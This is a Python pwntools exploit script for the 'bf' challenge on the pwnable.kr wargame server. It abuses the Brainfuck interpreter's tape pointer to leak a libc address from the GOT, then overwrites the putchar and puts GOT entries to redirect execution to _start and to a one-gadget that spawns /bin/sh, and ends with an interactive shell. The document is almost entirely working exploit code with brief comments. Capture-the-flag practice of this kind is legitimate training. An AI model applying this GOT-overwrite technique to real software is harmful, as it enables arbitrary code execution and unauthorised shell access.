# leak libc base
# write one-gadget to puts got 
'''
0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL
'''
# jump back to __libc_start_main with another got overwrite 
from pwn import *
context.log_level = 'debug'
e = ELF('./bf')
libc = ELF('./bf_libc.so')
#r = process('./bf_patched')
r = remote('pwnable.kr', 9001)
#r = gdb.debug('./bf_patched', 'b main\nc')
r.recvuntil(b']\n')
r.sendline(b'.'+b'<'*(e.sym['tape']-e.got['putchar'])+b'.>'*4+b'<'*4+b',>'*4+b'<'*(e.got['putchar']+4-e.got['puts'])+b',>'*4+b'.')
# make sure putchar is resolved first 
r.recv(1)
leak = u32(r.recv(4))
print('putchar@got =', hex(leak))
libc.address = leak - libc.sym['putchar']
print('libc.address =', hex(libc.address))
# putchar -> __libc_start_main(main), puts -> one-gadget
r.send(p32(e.sym['_start']))
r.send(p32(libc.address + 0x5fbd5))
r.interactive()


